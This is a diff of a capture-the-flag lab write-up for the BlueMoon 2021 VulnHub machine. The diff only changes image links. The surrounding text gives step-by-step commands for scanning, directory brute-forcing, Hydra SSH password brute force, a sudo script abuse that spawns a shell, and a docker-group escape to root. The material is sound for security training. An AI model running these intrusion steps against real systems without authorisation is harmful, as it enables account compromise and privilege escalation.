@@ -35,7 +35,7 @@ A step-by-step penetration testing walkthrough for the **BlueMoon 2021 VulnHub m
 
 [Download from VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)  
 Import and start it in **VirtualBox**  
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/Bluemoon.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/Bluemoon.png)
 
 ---
 
@@ -44,7 +44,7 @@ Locating the target IP within the local network range.
 ```bash
 netdiscover
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/Recon%20netdiscover.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/Recon%20netdiscover.png)
 
 ---
 
@@ -53,7 +53,7 @@ Check the IP address of the Kali Linux attacker machine.
 ```bash
 ifconfig
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/ifconfig.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/ifconfig.png)
 > Attacker machine's IP address (`192.168.56.108`)
 
 ---
@@ -65,7 +65,7 @@ Nmap is used to identify open ports and running services on the target machine.
 ```bash
 nmap -sn 192.168.56.0/24
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/nmap-sn.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/nmap-sn.png)
 > Identify the BlueMoon machine IP (`192.168.56.109`)
 
 ---
@@ -77,7 +77,7 @@ Perform a full port scan to identify open services.
 ```bash
 nmap -sV -p- 192.168.56.109
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/nmap-sv-p-.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/nmap-sv-p-.png)
 
 **Open ports found:**
 | Port | State | Service | Version                                      |
@@ -92,7 +92,7 @@ nmap -sV -p- 192.168.56.109
 
 Access the web server through the browser `http://192.168.56.109`.  
 No useful information is visible on the main page.  
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/http.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/http.png)
 
 Gobuster is used to perform directory brute-forcing on the web server to discover hidden directories that are not visible on the main webpage.  
 
@@ -102,7 +102,7 @@ gobuster dir -u http://192.168.56.109 -w /usr/share/wordlists/dirbuster/director
 The ``` -t10``` option increases the scanning speed by allowing multiple requests at the same time.  
 The ```--timeout 30s``` option prevents the scan from waiting too long for slow server responses.
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/gobuster.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/gobuster.png)
 > Discovered: `/hidden_text`
 
 ---
@@ -111,14 +111,14 @@ The ```--timeout 30s``` option prevents the scan from waiting too long for slow 
 
 Navigate to the discovered directory `http://192.168.56.109/hidden_text`
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/hidden_text.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/hidden_text.png)
 - Click the **"Thank you…"** link
 - A **QR code image** will appear — download it
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/QR%20code.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/QR%20code.png)
 
 Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/decodedcode.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/decodedcode.png)
 
 **Credentials found:**
 ```
@@ -134,14 +134,14 @@ Login using the discovered FTP credentials.
 ```bash
 ftp 192.168.56.109
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/loginFTP.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/loginFTP.png)
 
 List down the files, and there are two files called information.txt and p_lists.txt.
 
 ```bash
 ls
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/get.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/get.png)
 
 Download those files to host machine using get command.
 
@@ -149,19 +149,19 @@ Download those files to host machine using get command.
 get information.txt
 get p_lists.txt
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/ls.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/ls.png)
 
 Read the files:
 
 ```bash
 cat information.txt
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/catinformation.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catinformation.png)
 
 ```bash
 cat p_lists.txt
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/catp_lists.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catp_lists.png)
 
 > `information.txt` reveals a username: **robin**  
 > `p_lists.txt` is a password list
@@ -175,7 +175,7 @@ Using Hydra to brute force SSH.
 ```bash
 hydra -l robin -P p_lists.txt ssh://192.168.56.109
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/hydra.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/hydra.png)
 
 **Credentials Discovered:**
 ```
@@ -189,12 +189,12 @@ Password: k4rv3ndh4nh4ck3r
 ```bash
 ssh robin@192.168.56.109
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/SSHLogin.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/SSHLogin.png)
 ```bash
 ls -l
 cat user1.txt
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/flag1.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag1.png)
 > :triangular_flag_on_post: **Flag 1 obtained!**
 
 ---
@@ -205,7 +205,7 @@ Check sudo privileges.
 ```bash
 sudo -l
 ```
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/sudo-l.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/sudo-l.png)
 
 ```bash
 cd project
@@ -213,7 +213,7 @@ ls
 cat feedback.sh
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/catfeedbacksh.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/catfeedbacksh.png)
 
 > A script `feedback.sh` can be executed as **jerry**
 
@@ -223,7 +223,7 @@ Execute the script.
 sudo -u jerry /home/robin/project/feedback.sh
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/runasjerry.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/runasjerry.png)
 
 - When prompted for **name**, type: `jerry`
 - When prompted for **feedback**, type: `/bin/bash`
@@ -237,7 +237,7 @@ ls
 cat user2.txt
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/flag2.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag2.png)
 
 > :triangular_flag_on_post: **Flag 2 obtained!**
 
@@ -251,7 +251,7 @@ Upgrade to interactive shell.
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/phyton.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/phyton.png)
 
 Check group membership.
 
@@ -259,7 +259,7 @@ Check group membership.
 id
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/iddocker.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/iddocker.png)
 
 > User **jerry** is in the **docker** group.
 > Users in the docker group can run containers with root privileges.
@@ -270,7 +270,7 @@ List docker images.
 docker image ls
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/dockerimagels.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/dockerimagels.png)
 
 GTFOBins consists of commands we can use with docker in order to escalate our privileges to root. [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/)  
 So, we can exploit Alpine image and mount the root directory in a docker container which will prompt us the root shell.
@@ -281,7 +281,7 @@ Exploit the docker container to mount the root filesystem.
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/dockeralpine.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/dockeralpine.png)
 
 Verify root access and retrieve the root flag.
 
@@ -292,7 +292,7 @@ ls
 cat root.txt
 ```
 
-![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/blob/main/image%20Bluemoon/flag3.png)
+![image](https://github.com/MollyWasGud/Lab-2-Bluemoon/raw/main/image%20Bluemoon/flag3.png)
 
 > :triangular_flag_on_post: **Root Access Achieved – Machine Successfully Compromised!**
 
